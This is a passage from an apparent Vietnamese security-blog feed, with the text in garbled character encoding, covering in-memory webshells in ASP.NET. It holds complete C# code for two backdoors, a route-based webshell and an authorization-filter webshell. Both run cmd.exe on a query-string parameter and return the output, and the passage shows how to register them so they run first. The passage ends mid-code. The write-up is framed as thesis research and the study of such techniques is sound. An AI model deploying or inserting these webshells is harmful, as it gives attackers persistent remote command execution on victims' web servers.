&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;class E {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public class MyRouteBase : RouteBase
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public override RouteData GetRouteData(HttpContextBase httpContext)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; String cmd = httpContext.Request.QueryString[&amp;#34;command&amp;#34;];
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if (cmd != null)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; HttpResponseBase response = httpContext.Response;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Process p = new Process();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; p.StartInfo.FileName = &amp;#34;cmd.exe&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; p.StartInfo.Arguments = &amp;#34;/c&amp;#34; + cmd;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; p.StartInfo.UseShellExecute = false;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; p.StartInfo.RedirectStandardOutput = true;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; p.StartInfo.RedirectStandardError = true;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; p.Start();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; response.Write(System.Text.Encoding.Default.GetString(data));
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return null;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return null;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public E(){
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; RouteCollection routeCollection = RouteTable.Routes;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; routeCollection.Insert(0, new MyRouteBase());
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; HttpContext.Current.Response.AddHeader(&amp;#34;Custom-Header&amp;#34;, &amp;#34;Route Memshell Injected!!!!!!!!&amp;#34;);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; HttpContext.Current.Response.End();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Xuáº¥t hiá»‡n header Custom-Header trong response, chá»©ng tá» C# code Ä‘Ã£ Ä‘Æ°á»£c load:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/HJytUs1HZl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
RCE thÃ´i:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/HynF8oyBZl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;</description></item><item><title>Memory Webshell in .NET Framework</title><link>https://kev1n1203.github.io/p/memshell-dotnet/</link><pubDate>Mon, 12 Jan 2026 00:00:00 +0000</pubDate><guid>https://kev1n1203.github.io/p/memshell-dotnet/</guid><description>&lt;p&gt;DÆ°á»›i sá»± hÆ°á»›ng dáº«n sÃ¡t sao cá»§a ngÆ°á»i anh - ngÆ°á»i tháº§y &lt;a class="link" href="https://medium.com/@testbnull" target="_blank" rel="noopener"
&gt;Jang&lt;/a&gt;, mÃ¬nh Ä‘Ã£ báº£o vá»‡ thÃ nh cÃ´ng Ä‘á»“ Ã¡n tá»‘t nghiá»‡p Ä‘á» tÃ i Memory Webshell trong .NET vá»›i káº¿t quáº£ khÃ¡ tá»‘t. PhÃ¨ phÆ°á»¡n 1 thÃ¡ng khÃ´ng viáº¿t lÃ¡ch, mÃ¬nh nghÄ© mÃ¬nh nÃªn viáº¿t láº¡i gÃ¬ Ä‘Ã³ thay vÃ¬ chá»‰ lÆ°u trá»¯ kiáº¿n thá»©c trong quyá»ƒn Ä‘á»“ Ã¡n ná»™p cho nhÃ  trÆ°á»ng, vá»«a Ä‘á»ƒ cá»§ng cá»‘ kiáº¿n thá»©c, vá»«a Ä‘á»ƒ tiá»‡n search láº¡i sau nÃ y.&lt;br&gt;
ÄÃ¢y sáº½ lÃ  bÃ i viáº¿t trÃ¬nh bÃ y nhá»¯ng hiá»ƒu biáº¿t cá»§a mÃ¬nh trong quÃ¡ trÃ¬nh há»c há»i vÃ  nghiÃªn cá»©u ká»¹ thuáº­t Memshell trong &lt;code&gt;ASP.NET&lt;/code&gt;, áº£nh hÆ°á»Ÿng náº·ng ná» tá»« &lt;a class="link" href="https://yzddmr6.com/" target="_blank" rel="noopener"
&gt;yzddmr6&lt;/a&gt; vÃ  &lt;a class="link" href="https://endy.gitbook.io/endys-notes" target="_blank" rel="noopener"
&gt;endy&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id="http-life-cycle"&gt;HTTP Life Cycle
&lt;/h2&gt;&lt;p&gt;Trong mÃ´i trÆ°á»ng .NET Framework, webapp sáº½ Ä‘Æ°á»£c deploy dÆ°á»›i web server lÃ  IIS (Internet Information Services) vÃ  thÆ°á»ng code theo 2 dáº¡ng: WebForms vÃ  WebMVC. Táº¥t cáº£ cÃ¡c request dÃ¹ Ä‘Æ°á»£c code theo kiá»ƒu nÃ o Ä‘á»u sáº½ Ä‘i qua má»™t chuá»—i cÃ¡c sá»± kiá»‡n chuyÃªn biá»‡t Ä‘á»ƒ xá»­ lÃ½ yÃªu cáº§u Ä‘áº¿n trong ASP.NET, gá»i lÃ  HTTP Pipeline. MÃ´ hÃ¬nh cá»§a HTTP pipeline cÃ³ thá»ƒ Ä‘Æ°á»£c mÃ´ táº£ nhÆ° sau:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/rJMJibiHZx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
QuÃ¡ trÃ¬nh nÃ y Ä‘i qua má»™t sá»‘ bÆ°á»›c:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Nháº­n HTTP request tá»« ngÆ°á»i dÃ¹ng, IIS sá»­ dá»¥ng native dll Aspnet_isapi.dll Ä‘á»ƒ báº¯t Ä‘áº§u quÃ¡ trÃ¬nh xá»­ lÃ½, Ä‘Æ°a request vÃ o má»™t instance cá»§a class HttpRuntime.&lt;/li&gt;
&lt;li&gt;HttpRuntime class gá»i Ä‘áº¿n HttpApllicationFactory yÃªu cáº§u cáº¥p instance HttpApplication Ä‘á»ƒ xá»­ lÃ½ request, khá»Ÿi táº¡o pipeline, má»—i instance chá»©a cÃ¡c HttpModule - nÆ¡i kiá»ƒm tra vÃ  thay Ä‘á»•i ná»™i dung cá»§a HTTP request thÃ´ng qua sá»± kiá»‡n cÃ³ thá»© tá»± nháº¥t Ä‘á»‹nh. Request Ä‘Æ°á»£c duyá»‡t qua nhiá»u sá»± kiá»‡n, gá»i Ä‘Ã¢y lÃ  HTTP Pipeline&lt;/li&gt;
&lt;li&gt;Khi gá»i Ä‘áº¿n sá»± kiá»‡n PreRequestHandlerExecute, IIS sáº½ chá»n ra HttpHandler tÆ°Æ¡ng á»©ng Ä‘á»ƒ xá»­ lÃ½ thá»±c táº¿ vÃ  render pháº£n há»“i vá» cho client. VÃ­ dá»¥ nhÆ° MvcHandler trong Web MVC vÃ  PageRouteHandler trong Web Forms.&lt;/li&gt;
&lt;li&gt;HTTP Pipeline sá»­ dá»¥ng object HttpContext Ä‘á»ƒ biá»ƒu thá»‹ cho HTTP request hiá»‡n táº¡i, object nÃ y Ä‘Æ°á»£c truyá»n vÃ o khi khá»Ÿi táº¡o HttpApplication, Ä‘i qua quÃ¡ trÃ¬nh xá»­ lÃ½ cá»§a HttpModule cÅ©ng nhÆ° Ä‘Æ°á»£c Ä‘Æ°a xuá»‘ng HttpHandler táº¡i method ProcessRequest.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Viá»‡c deploy memshell sáº½ sá»­ dá»¥ng cÃ¡c component cÃ³ kháº£ nÄƒng xá»­ lÃ½ vÃ  kiá»ƒm soÃ¡t HTTP Request/Response trong pipeline, nÃªn Ä‘Ã¢y lÃ  nhá»¯ng kiáº¿n thá»©c ná»n táº£ng cáº§n pháº£i biáº¿t trÆ°á»›c khi tÃ¬m hiá»ƒu Ä‘áº¿n memshell.&lt;/p&gt;
&lt;h2 id="filter-memory-webshell"&gt;Filter Memory Webshell
&lt;/h2&gt;&lt;p&gt;Sau khi chá»n Ä‘Æ°á»£c MVCHandler Ä‘á»ƒ xá»­ lÃ½ request, mÃ´ hÃ¬nh ASP.NET MVC sáº½ Ä‘i qua class Controller - cÃ³ nhiá»‡m vá»¥ chá»n ra ActionMethod Ä‘Ãºng Ä‘á»ƒ thá»±c thi request vÃ  tráº£ káº¿t quáº£ vá» cho client. NhÆ°ng trÆ°á»›c Ä‘Ã³ thÃ¬ MVC cung cáº¥p cho ngÆ°á»i dÃ¹ng cÆ¡ cháº¿ Filter â€“ cÃ³ chá»©c nÄƒng &amp;ldquo;filter&amp;rdquo; cÃ¡c request tÆ°Æ¡ng tá»± nhÆ° class Filter cá»§a Java Tomcat, cÃ³ kháº£ nÄƒng thÃªm code xá»­ lÃ½ logic, log lá»—i, kiá»ƒm tra xÃ¡c thá»±c trÆ°á»›c khi request Ä‘áº¿n bÆ°á»›c Action Method.
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/rJsG0-sHWl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
TÃ­nh nÄƒng nÃ y náº±m trong MVC Middleware chá»‰ thuá»™c ASP.NET MVC, nÃªn Ä‘á»ƒ triá»ƒn khai Ä‘Æ°á»£c thÃ¬ webapps cáº§n Ä‘Æ°á»£c code theo kiá»ƒu MVC&lt;/p&gt;
&lt;h3 id="filter-in-net"&gt;Filter in .NET
&lt;/h3&gt;&lt;p&gt;Khi táº¡o 1 project web MVC sáº½ xuáº¥t hiá»‡n 3 thÆ° má»¥c Models â€“ Views â€“ Controllers, ngoÃ i ra tá»“n táº¡i má»™t sá»‘ thÆ° má»¥c máº·c Ä‘á»‹nh khÃ¡c vá»›i cÃ¡c chá»©c nÄƒng chá»§ yáº¿u Ä‘á»ƒ lÆ°u trá»¯ nhÆ° App_Data, Content, Scripts,&amp;hellip; Äáº·c biá»‡t chÃº Ã½ Ä‘áº¿n file Global.asax, file nÃ y sáº½ Ä‘Æ°á»£c gá»i 1 láº§n khi á»©ng dá»¥ng web báº¯t Ä‘áº§u khá»Ÿi cháº¡y, chá»©a cÃ¡c thÃ nh pháº§n cÆ¡ báº£n cáº§n pháº£i Ä‘Æ°á»£c khai bÃ¡o Ä‘á»ƒ start up web service, Ä‘Ã³ lÃ  cÃ¡c filters, routes vÃ  bundles:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/rJ7jbfiHWl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Táº¡i file FilterConfig.cs náº±m trong App_Start chá»©a cÃ¢u lá»‡nh thÃªm filter tá»± Ä‘á»‹nh nghÄ©a vÃ o GlobalFilterCollection, máº·c Ä‘á»‹nh cÃ³ filter HandleErrorAttribute Ä‘á»ƒ xá»­ lÃ½ lá»—i
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/ByByzMjr-x.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
CÃ¡c filter thá»±c cháº¥t sáº½ Ä‘Æ°á»£c thÃªm táº¡i class GlobalFilterCollection thuá»™c namespace System.Web.Mvc:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/BkHWzzorWg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Vá» cÆ¡ báº£n, quÃ¡ trÃ¬nh Add sáº½ diá»…n ra nhÆ° sau:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Táº¡o má»™t &lt;code&gt;List&amp;lt;Filter&amp;gt;&lt;/code&gt; Ä‘á»ƒ lÆ°u trá»¯ Filter dÆ°á»›i dáº¡ng list, lÆ°u táº¡i thuá»™c tÃ­nh &lt;code&gt;_filters&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Kiá»ƒm tra Filter Ä‘Æ°á»£c thÃªm vÃ o táº¡i method ValidateFilterInstance, náº¿u khÃ´ng thá»a mÃ£n sáº½ tráº£ vá» lá»—i&lt;/li&gt;
&lt;li&gt;ThÃªm Filter vÃ o List khai bÃ¡o trÆ°á»›c Ä‘Ã³, náº¿u Filter khÃ´ng Ä‘i kÃ¨m giÃ¡ trá»‹ order sáº½ táº¡o order vá»›i kiá»ƒu dá»¯ liá»‡u integer vÃ  giÃ¡ trá»‹ máº·c Ä‘á»‹nh lÃ  null&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Method ValidateFilterInstance Ä‘Æ°á»£c gá»i Ä‘á»ƒ xem filter cÃ³ implement cÃ¡c interface cá»§a má»™t filter há»£p lá»‡ hay khÃ´ng:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/BymLzzirbl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
CÃ¡c filter há»£p lá»‡ gá»“m cÃ³:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Authorization filters: phá»¥c vá»¥ xÃ¡c thá»±c vÃ  á»§y quyá»n trÆ°á»›c khi bÆ°á»›c vÃ o cÃ¡c action cá»§a controller&lt;/li&gt;
&lt;li&gt;Action filters: chá»©a logic mÃ  Ä‘Æ°á»£c thá»±c thi trÆ°á»›c vÃ  sau khi thá»±c thi Controller&lt;/li&gt;
&lt;li&gt;Result filters: thá»±c thi trÆ°á»›c vÃ  sau khi render View&lt;/li&gt;
&lt;li&gt;Exception filters: log, handle vÃ  catch cÃ¡c exception xáº£y ra trong quÃ¡ trÃ¬nh Controller hoáº·c View cháº¡y&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Trong sá»‘ cÃ¡c filter nÃ y thÃ¬ Authorization filters Ä‘Æ°á»£c gá»i Ä‘áº§u tiÃªn. MÃ¬nh sáº½ Æ°u tiÃªn chá»n nhá»¯ng filter sá»›m nháº¥t Ä‘á»ƒ inject&lt;/p&gt;
&lt;h3 id="filter-comparison"&gt;Filter Comparison
&lt;/h3&gt;&lt;p&gt;Khi tá»“n táº¡i 2 filters implements cÃ¹ng má»™t interface, thá»© tá»± thá»±c thi sáº½ Ä‘Æ°á»£c xÃ¡c Ä‘á»‹nh thÃ´ng qua 2 tham sá»‘: Order vÃ  Scope
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/rJ3tMfirZx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Náº¿u chÆ°a khai bÃ¡o thÃ¬ máº·c Ä‘á»‹nh Order sáº½ Ä‘Æ°á»£c gÃ¡n lÃ  -1. CÃ²n giÃ¡ trá»‹ scope Ä‘Æ°á»£c biá»ƒu diá»…n nhÆ° sau:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/SkaizMsSWx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Logic so sÃ¡nh náº±m táº¡i class FilterComparer thuá»™c FilterProviderCollection:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;GiÃ¡ trá»‹ Order cÃ ng nhá» thÃ¬ cÃ ng Ä‘Æ°á»£c Æ°u tiÃªn thá»±c thi&lt;/li&gt;
&lt;li&gt;Khi giÃ¡ trá»‹ Order báº±ng nhau sáº½ xem xÃ©t Ä‘áº¿n giÃ¡ trá»‹ Scope. TÆ°Æ¡ng tá»± nhÆ° Order, giÃ¡ trá»‹ Scope cÃ ng nhá» thÃ¬ má»©c Ä‘á»™ Æ°u tiÃªn cÃ ng cao.
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/rkypzfsS-e.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;=&amp;gt; Chá»‰ cáº§n set giÃ¡ trá»‹ cho Filter.Order má»™t sá»‘ nguyÃªn nhá» hÆ¡n -1 lÃ  Ä‘Æ°á»£c.&lt;/p&gt;
&lt;h3 id="deploy"&gt;Deploy
&lt;/h3&gt;&lt;p&gt;VÃ¬ class GlobalFilterCollection lÃ  public class nÃªn mÃ¬nh cÃ³ thá»ƒ gá»i Ä‘áº¿n mÃ  khÃ´ng cáº§n reflection, logic code sáº½ nhÆ° sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;public class MalFilter : IAuthorizationFilter {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public void OnAuthorization(AuthorizationContext filterContext){
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; String cmd = filterContext.HttpContext.Request.QueryString[&amp;#34;command&amp;#34;];
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if (cmd != null){
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; HttpResponseBase response = filterContext.HttpContext.Response;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Process p = new Process();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; p.StartInfo.FileName = &amp;#34;cmd.exe&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; p.StartInfo.Arguments = &amp;#34;/c&amp;#34; + cmd;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; p.Start();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;response.Write(System.Text.Encoding.Default.GetString(data));
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; response.End();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;GlobalFilters.Filters.Add(new MalFilter(), -10);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Sau Ä‘Ã³ thÃ¬ mÃ¬nh cÃ³ thá»ƒ exec command vá»›i cÃ¡c Ä‘Æ°á»ng dáº«n há»£p lá»‡:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/SyzjVzoHZe.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
MÃ¬nh nÃ³i lÃ  Ä‘Æ°á»ng dáº«n há»£p lá»‡ bá»Ÿi vÃ¬ filter nÃ y khÃ´ng Ä‘Æ°á»£c call náº¿u path khÃ´ng tá»“n táº¡i, Ä‘Ã¢y cÅ©ng lÃ  1 lÆ°u Ã½ khi sá»­ dá»¥ng loáº¡i memshell nÃ y:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/rJM04zoSbl.png"
loading="lazy"
alt="image"
&gt;&lt;/p&gt;
&lt;h2 id="route-memory-webshell"&gt;Route Memory Webshell
&lt;/h2&gt;&lt;p&gt;Tiáº¿p Ä‘áº¿n lÃ  ká»¹ thuáº­t Route, lá»£i dá»¥ng cÆ¡ cháº¿ routing Ä‘á»ƒ xá»­ lÃ½, cÆ¡ cháº¿ nÃ y lÃ  má»™t module hoáº¡t Ä‘á»™ng trong pipeline, Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ phá»¥c vá»¥ xá»­ lÃ½ URL khi cÃ³ request Ä‘áº¿n. &lt;br&gt;
Cá»¥ thá»ƒ hÆ¡n, khi application event PostResolveRequestCache Ä‘Æ°á»£c gá»i trong request pipeline, ASP.NET Routing sáº½ kiá»ƒm tra Ä‘Æ°á»ng dáº«n cá»§a request Ä‘á»ƒ chuyá»ƒn cho HttpHandler phÃ¹ há»£p, rá»“i gá»­i lÃªn framework layer cao hÆ¡n tiáº¿p tá»¥c thá»±c thi:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/rJR3Hzjr-l.png"
loading="lazy"
alt="image"
&gt;&lt;/p&gt;
&lt;h3 id="logic-add-route"&gt;Logic Add Route
&lt;/h3&gt;&lt;p&gt;File RouteConfig.cs máº·c Ä‘á»‹nh sá»­ dá»¥ng method MapRoute Ä‘á»ƒ Ä‘á»‹nh nghÄ©a Route cÃ³ trong á»©ng dá»¥ng web vá»›i tÃªn lÃ  Default:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/BJw88zor-e.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
ÄÃ¢y lÃ  cÃ¡ch mÃ  WebMVC sá»­ dá»¥ng Ä‘á»ƒ thÃªm vÃ  Ä‘á»‹nh nghÄ©a route má»›i, Ä‘i sÃ¢u vÃ o hÃ m MapRoute mÃ¬nh tháº¥y thá»±c cháº¥t nÃ³ Ä‘ang khá»Ÿi táº¡o thÃ´ng tin Route tá»« dá»¯ liá»‡u truyá»n vÃ o, cÃ²n hÃ m thá»±c sá»± thÃªm Route vÃ o RouteCollection náº±m táº¡i method Add thuá»™c namespace System.Web.Routing:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/B1jyDzsSbe.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Method Add cáº§n 2 tham sá»‘. Tham sá»‘ name khÃ´ng quan trá»ng khi Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ xem Ä‘Ã£ cÃ³ route nÃ o cÃ³ giÃ¡ trá»‹ name nÃ y chÆ°a. CÃ²n tham sá»‘ route Ä‘Æ°á»£c Ã©p kiá»ƒu vá» RouteBase lÃ  quan trá»ng nháº¥t. RouteBase lÃ  má»™t abstract class, Ä‘Æ°á»£c class System.Web.Routing.Route implement máº·c Ä‘á»‹nh.&lt;br&gt;
NhÆ° váº­y sáº½ cÃ³ Ã­t nháº¥t 2 cÃ¡ch Ä‘á»ƒ triá»ƒn khai Route Memory Webshell, má»™t lÃ  tá»± táº¡o class Ä‘á»ƒ implement RouteBase, hai lÃ  sá»­ dá»¥ng System.Web.Routing.Route Ä‘Ã£ implement RouteBase sáºµn.&lt;/p&gt;
&lt;h3 id="tá»±-implement-routebase"&gt;Tá»± Implement RouteBase:
&lt;/h3&gt;&lt;p&gt;VÃ¬ lÃ  1 abstract class nÃªn mÃ¬nh cáº§n override 2 method GetRouteData vÃ  GetVirtualPath cÃ³ trong nÃ³:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/By8ODGsS-l.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Hai method nháº­n vÃ o cÃ¡c tham sá»‘ khÃ¡c nhau nhÆ°ng Ä‘á»u cÃ³ object context cá»§a current request nÃªn Ä‘á»u cÃ³ thá»ƒ sá»­ dá»¥ng Ä‘Æ°á»£c. CÃ´ng dá»¥ng cá»§a chÃºng gáº§n nhÆ° ngÆ°á»£c nhau:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;GetRouteData: Tráº£ vá» cÃ¡c thÃ´ng tin routing cá»§a request khi request match vá»›i route&lt;/li&gt;
&lt;li&gt;GetVirtualPath: Láº¥y thÃ´ng tin vá» route cá»§a request khi request match vá»›i value truyá»n vÃ o&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;MÃ¬nh cÃ³ script ngáº¯n nÃ y Ä‘á»ƒ check xem method nÃ o Ä‘Æ°á»£c thá»±c hiá»‡n trÆ°á»›c:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;script runat=&amp;#34;server&amp;#34;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public class MyRouteBase : RouteBase{
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public override RouteData GetRouteData(HttpContextBase httpContext){
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Console.WriteLine(&amp;#34;GetRouteData is called!!&amp;#34;);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return null;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values){
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Console.WriteLine(&amp;#34;GetVirtualPath is called!!&amp;#34;);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return null;
